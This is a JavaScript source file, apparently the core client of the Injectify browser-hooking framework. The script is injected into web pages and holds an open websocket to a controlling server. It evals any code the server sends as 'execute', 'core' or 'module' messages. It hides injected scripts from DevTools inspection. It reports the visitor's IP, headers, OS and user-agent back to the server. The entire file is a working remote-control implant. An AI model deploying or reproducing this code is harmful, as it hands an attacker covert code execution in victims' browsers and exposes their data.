/**
 * Injectify core API
 * @class
 */
window['injectify'] = /** @class */ (function () {
    function Injectify() {
    }
    /**
     * Overrides the message handler for the websocket connection
     * @param {function} callback Callback to be triggered once message received
     */
    Injectify.listener = function (callback) {
        var _this = this;
        ws.onmessage = function (message) {
            try {
                var data = JSON.parse(message.data);
                if (_this['listeners'] && data.t && _this['listeners'][data.t]) {
                    /**
                     * Pre-process some topic's data
                     */
                    if (data.t == 'pong') {
                        data.d = +new Date - data.d;
                    }
                    /**
                     * Callback the listeners
                     */
                    _this['listeners'][data.t].callback(data.d);
                    if (_this['listeners'][data.t].once)
                        delete _this['listeners'][data.t];
                }
                else {
                    callback(data.d, data.t);
                }
            }
            catch (e) {
                if (_this.debug)
                    throw e;
                _this.error(e.stack);
            }
        };
    };
    /**
     * Listen for a topic from websocket connection
     * @param {string} topic Topic name to listen to
     * @param {function} callback Callback to be triggered once topic received
     */
    Injectify.listen = function (topic, callback, once) {
        if (!once)
            once = false;
        if (!this['listeners'])
            this['listeners'] = {};
        this['listeners'][topic] = {
            callback: function (data) {
                callback(data);
            },
            raw: callback,
            once: once
        };
    };
    /**
     * Unhook a websocket topic listener
     * @param {string} topic Topic name to unlisten
     * @param {function} callback
     */
    Injectify.unlisten = function (topic, callback) {
        /**
         * If the listener is missing, return false
         */
        if (!this['listeners'] ||
            !this['listeners'][topic] ||
            !this['listeners'][topic].callback ||
            !this['listeners'][topic].raw ||
            (callback &&
                callback.toString() !== this['listeners'][topic].raw.toString()))
            return false;
        return delete this['listeners'][topic];
    };
    /**
     * Send data to websocket
     * @param {string} topic Message topic
     * @param {Object} data Message data
     */
    Injectify.send = function (topic, data) {
        /**
         * If the websocket is dead, return
         */
        if (ws.readyState == 0)
            return;
        try {
            ws.send(JSON.stringify({
                t: topic,
                d: data,
            }));
        }
        catch (e) {
            if (this.debug)
                console.error(e);
        }
    };
    /**
     * Log data to websocket connection (and locally)
     * @param {(Object|string)} message Data to be logged
     * @param {boolean} local Whether to log it in the local console
     */
    Injectify.log = function (message, local) {
        this.send('r', message);
        if (local)
            console.log(message);
    };
    /**
     * Get the websocket ping time (in milliseconds)
     * @param {function} callback Callback to be executed on ping complete
     */
    Injectify.ping = function (callback) {
        this.send('ping', +new Date());
        if (callback)
            this.listen('pong', callback, true);
    };
    /**
     * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
     * @param {string} func the contents inside the <script> tag
     * @param {element} targetParent element to execute the script under, defaults to document.head
     */
    Injectify.exec = function (func, targetParent) {
        /**
         * Default o using document.head as the script container
         */
        if (!targetParent)
            targetParent = document.head;
        /**
         * Turn the function into a self-executing constructor
         */
        if (typeof func === 'function')
            func = '(' + func.toString() + ')()';
        /**
         * Create, append & remove a script tag
         */
        var script = document.createElement('script');
        script.innerHTML = func;
        targetParent.appendChild(script);
        targetParent.removeChild(script);
    };
    /**
     * Loads a module from the injectify server
     * @param {string} name module name
     * @param {(string|Object)} params parameters to be sent to the module
     * @param {function} callback optional callback once the module has been loaded
     */
    Injectify.module = function (name, params, callback, errorCallback) {
        var token = +new Date;
        /**
         * Parse the parameters
         */
        if (typeof params === 'function') {
            callback = params;
            if (typeof callback === 'function')
                window['e' + token] = callback;
        }
        if (typeof callback === 'function')
            window[token] = callback;
        if (typeof errorCallback === 'function')
            window['e' + token] = errorCallback;
        /**
         * Emit to server
         */
        this.send('module', {
            name: name,
            token: token,
            params: params
        });
    };
    Object.defineProperty(Injectify, "present", {
        /**
         * Check that the Injectify core is active
         */
        get: function () {
            return true;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "info", {
        /**
         * Returns information about Injectify
         */
        get: function () {
            /**
             * Read the project name from the URL
             */
            var project = ws.url.split('?')[1];
            if (this.debug)
                project = project.substring(1);
            return {
                'project': atob(project),
                'websocket': ws.url,
                'platform': client.platform,
                'duration': this.duration,
                'debug': this.debug,
                'os': client.os,
                'ip': client.ip,
                'headers': client.headers,
                'user-agent': client.agent
            };
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "debug", {
        /**
         * Returns whether injectify is in debug mode or not
         * true  - being used in development
         * false - console output should be suppressed
         */
        get: function () {
            return ws.url.split('?')[1].charAt(0) == "$";
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "duration", {
        /**
         * Returns the amount of time connected to injectify server
         */
        get: function () {
            var duration = (+new Date - this['connectTime']) / 1000;
            return Math.round(duration);
        },
        enumerable: true,
        configurable: true
    });
    /**
     * Error handler
     * @param {error} error The error to be handled
     */
    Injectify.error = function (error) {
        // this['errorLimiting']++
        // if (this['errorLimiting'] >= 20) {
        // 	setTimeout(function() {
        // 		console.log('called!')
        // 		this['errorLimiting'] = 0
        // 	}, 100)
        // } else {
        this.send('e', error);
        // }
    };
    return Injectify;
}());
/**
 * Set the connect time
 */
window['injectify'].connectTime = +new Date;
/**
 * Debug helpers
 */
if (window['injectify'].debug) {
    console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', window['injectify'].info);
}
/**
 * Replace the basic websocket handler with a feature-rich one
 */
window['injectify'].listener(function (data, topic) {
    try {
        if (topic == 'error') {
            console.error(data);
            return;
        }
        if (topic == 'module') {
            /**
             * Create the module object
             */
            var module = {
                name: data.name,
                token: data.token,
                callback: window[data.token],
                returned: undefined,
                config: {
                    async: false
                }
            };
            if (!data.error) {
                /**
                 * Evaluate the script
                 */
                eval(data.script);
                /**
                 * If in debug mode display verbose output
                 */
                if (window['injectify'].debug) {
                    console.warn('📦 Executed module "' + module.name + '"', module);
                }
                /**
                 * If the module isn't asynchronous call it's callback
                 */
                if (!module.config.async && data !== false && typeof module.callback == 'function') {
                    module.callback(module.returned);
                }
                /**
                 * Delete it's synchronous callback
                 */
                return delete window[data.token];
            }
            else if (window['injectify'].debug && data.error.message) {
                console.error('📦 ' + data.error.message, module);
            }
        }
        if (topic == 'execute' || topic == 'core') {
            eval(data);
        }
    }
    catch (e) {
        window['injectify'].error(e.stack);
    }
});
/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping']);
window['ping'] = setInterval(function () {
    window['injectify'].ping();
}, 5000);
